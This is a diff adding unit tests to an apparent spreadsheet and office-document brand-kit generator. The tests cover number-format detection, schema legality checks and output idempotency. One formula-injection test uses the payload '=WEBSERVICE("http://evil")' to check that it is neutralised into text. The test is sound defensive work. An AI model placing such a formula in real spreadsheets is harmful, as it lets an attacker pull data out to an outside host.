@@ -299,6 +299,11 @@ class NumberFormatRoleTest(unittest.TestCase):
             "0.00E+00": "scientific",
             "General": None,
             "": None,
+            # Elapsed-time masks (time token only inside brackets) -> time, not None.
+            "[h]:mm": "time",
+            "[mm]:ss": "time",
+            # Accounting mask whose currency sits in a bracket + padding idioms.
+            r"_-[$€-2]* #,##0.00_-;-[$€-2]* #,##0.00_-": "accounting",
         }
         for code, fam in cases.items():
             self.assertEqual(xs.number_format_family(code), fam, code)
@@ -402,6 +407,126 @@ class NumberFormatRoleTest(unittest.TestCase):
             loaded = self._extract(td, self._build_shell(td))
             grid = GridDocument(cells={"price": 99.9}, formats={"price": "currency"})
             a, b = td / "a.xlsx", td / "b.xlsx"
+            xlsx_generate.generate(loaded.profile, loaded.shell_path, grid, a)
+            xlsx_generate.generate(loaded.profile, loaded.shell_path, grid, b)
+            self.assertEqual(
+                hashlib.sha256(a.read_bytes()).hexdigest(),
+                hashlib.sha256(b.read_bytes()).hexdigest(),
+            )
+
+
+class NumberFormatResolverLegalityTest(unittest.TestCase):
+    """A number_format resolver is legal ONLY for xlsx: smuggled into a docx/pptx
+    profile it must be rejected by validate (the per-kind brand-guarantee gate)."""
+
+    def test_number_format_role_rejected_on_non_xlsx_kind(self) -> None:
+        from brandkit.profile import schema
+
+        for kind in ("docx", "pptx"):
+            prof = schema.build_envelope(kind, {"name": "t"})
+            prof["roles"] = {
+                "_index": ["number.currency"],
+                "number.currency": {
+                    "resolver": {"type": "number_format", "number_format": "0.00"},
+                    "status": "best_effort",
+                },
+            }
+            problems = schema.validate(prof)
+            self.assertTrue(
+                any("number_format" in p and "not legal" in p for p in problems),
+                f"{kind}: {problems}",
+            )
+
+
+class FormulaInjectionTest(unittest.TestCase):
+    """The engine never AUTHORS formulas: an author '='-led value is neutralized to a
+    TEXT cell (verbatim, not executed) and surfaced, and the QA gate fails closed on
+    any output formula the shell did not have (defense-in-depth)."""
+
+    def test_fill_cell_neutralizes_author_formula_to_text(self) -> None:
+        wb = Workbook()
+        ws = wb.active
+        sink: list[Finding] = []
+        wrote = xlsx_generate._fill_cell(
+            ws["A1"], '=WEBSERVICE("http://evil")', sink=sink, where="x"
+        )
+        self.assertTrue(wrote)
+        self.assertEqual(ws["A1"].data_type, "s")  # TEXT, never a live formula
+        self.assertEqual(ws["A1"].value, '=WEBSERVICE("http://evil")')  # verbatim
+        self.assertEqual(len(sink), 1)
+        self.assertEqual(sink[0].check, "formula_injection_neutralized")
+        self.assertEqual(sink[0].severity, "WARNING")
+
+    def test_fill_cell_preserves_shell_formula_and_returns_false(self) -> None:
+        wb = Workbook()
+        ws = wb.active
+        ws["A1"] = "=1+2"  # an existing shell formula
+        wrote = xlsx_generate._fill_cell(ws["A1"], 99, where="x")
+        self.assertFalse(wrote)  # not written -> caller must not format it
+        self.assertEqual(ws["A1"].value, "=1+2")  # preserved verbatim
+
+    def test_qa_flags_a_newly_authored_output_formula(self) -> None:
+        from brandkit.qa import checks_deterministic as cd
+
+        with tempfile.TemporaryDirectory() as t:
+            t = Path(t)
+            wb = Workbook()
+            wb.active["A1"] = "x"
+            shell = t / "shell.xlsx"
+            wb.save(shell)
+            wb2 = Workbook()
+            wb2.active["A1"] = "x"
+            wb2.active["B1"] = "=1+2"  # a formula the shell did NOT have
+            out = t / "out.xlsx"
+            wb2.save(out)
+            prof = {"kind": "xlsx"}
+            findings = cd.check_formula_preservation(shell, out, prof)
+            self.assertTrue(
+                any(
+                    f.severity == "ERROR" and "never authors" in f.message
+                    for f in findings
+                ),
+                [f.message for f in findings],
+            )
+
+
+class XlsxIdempotencyEdgeTest(unittest.TestCase):
+    def test_generate_is_idempotent_when_shell_core_xml_lacks_created(self) -> None:
+        # openpyxl fabricates a wall-clock created when the shell has none; the
+        # generator pins a fixed created so generate-twice stays byte-identical.
+        import hashlib
+        import re
+        import zipfile
+
+        with tempfile.TemporaryDirectory() as t:
+            t = Path(t)
+            wb = Workbook()
+            wb.active["A1"] = "x"
+            wb.defined_names.add(DefinedName("cellx", attr_text="Sheet!$A$1"))
+            shell = t / "shell.xlsx"
+            wb.save(shell)
+            # Strip <dcterms:created> from the shell's core.xml.
+            parts = {}
+            with zipfile.ZipFile(shell) as z:
+                for n in z.namelist():
+                    parts[n] = z.read(n)
+            parts["docProps/core.xml"] = re.sub(
+                rb"<dcterms:created[^>]*>[^<]*</dcterms:created>",
+                b"",
+                parts["docProps/core.xml"],
+            )
+            with zipfile.ZipFile(shell, "w") as z:
+                for n, b in parts.items():
+                    z.writestr(n, b)
+            old = os.getcwd()
+            os.chdir(t)
+            try:
+                xlsx_extract.extract(shell, "nc", scope="project", cwd=t)
+                loaded = store.load_profile("nc", "project")
+            finally:
+                os.chdir(old)
+            grid = GridDocument(cells={"cellx": "hello"})
+            a, b = t / "a.xlsx", t / "b.xlsx"
             xlsx_generate.generate(loaded.profile, loaded.shell_path, grid, a)
             xlsx_generate.generate(loaded.profile, loaded.shell_path, grid, b)
             self.assertEqual(
